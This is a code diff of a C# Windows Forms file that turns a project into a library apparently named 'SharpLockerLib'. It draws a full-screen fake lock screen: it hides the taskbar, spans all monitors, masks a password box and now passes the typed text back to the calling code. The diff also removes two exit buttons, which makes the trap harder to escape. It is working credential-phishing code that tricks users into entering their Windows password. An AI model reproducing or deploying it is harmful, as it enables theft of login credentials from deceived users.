@@ -1,22 +1,25 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.ComponentModel;
-using System.Data;
 using System.Diagnostics;
 using System.Drawing;
-using System.Linq;
-using System.Text;
 using System.Threading;
 using System.Windows.Forms;
-using System.Linq;
 using System.Runtime.InteropServices;
 
-namespace WindowsFormsApp9
+namespace  SharpLockerLib
 {
+    public class StrResult
+    {
+        public String val { get; set; }
+    }
+
     public partial class Form1 : Form
     {
-        public Form1()
+        StrResult input;
+
+        public Form1(ref StrResult result)
         {
+            this.input = result;
             InitializeComponent();
             Taskbar.Hide();
             FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
@@ -38,8 +41,8 @@ namespace WindowsFormsApp9
             int locked = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 57;
             int bottomname = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 95;
             textBox2.Top = usernameloch;
-            pictureBox1.Top = usericonh;
-            button1.Top = buttonh;
+            userPic.Top = usericonh;
+            confirmBtn.Top = buttonh;
             label2.Top = usernameh;
             label1.Top = locked;
             textBox2.UseSystemPasswordChar = true;
@@ -47,7 +50,6 @@ namespace WindowsFormsApp9
 
             foreach (var screen in Screen.AllScreens)
             {
-
                 Thread thread = new Thread(() => WorkThreadFunction(screen));
                 thread.Start();
             }
@@ -112,12 +114,6 @@ namespace WindowsFormsApp9
         {
             try
             {
-                if (screen.Primary == true)
-                {
-                   
-                    
-                }
-
                 if (screen.Primary == false)
                 {
                     int mostLeft = screen.WorkingArea.Left;
@@ -147,7 +143,7 @@ namespace WindowsFormsApp9
 
         }
 
-        private void pictureBox1_Click(object sender, EventArgs e)
+        private void userPic_Click(object sender, EventArgs e)
         {
 
         }
@@ -169,40 +165,26 @@ namespace WindowsFormsApp9
             }
         }
 
-        private void pictureBox2_Click(object sender, EventArgs e)
-        {
-            Taskbar.Show();
-            System.Windows.Forms.Application.Exit();
-        }
-
         protected override void OnClosing(CancelEventArgs e)
         {
-                Taskbar.Show();
+            Taskbar.Show();
             base.OnClosing(e);
         }
 
         private void textBox2_TextChanged(object sender, EventArgs e)
         {
-            Console.WriteLine(textBox2);
+            this.input.val = textBox2.Text;
         }
 
         private void label1_Click(object sender, EventArgs e)
         {
 
         }
-
-        private void pictureBox3_Click(object sender, EventArgs e)
-        {
-            Taskbar.Show();
-            System.Windows.Forms.Application.Exit();
-        }
-
-        private void button1_Click_1(object sender, EventArgs e)
+        
+        private void confirmBtnClick(object sender, EventArgs e)
         {
             Taskbar.Show();
             System.Windows.Forms.Application.Exit();
         }
     }
-    
-
 }
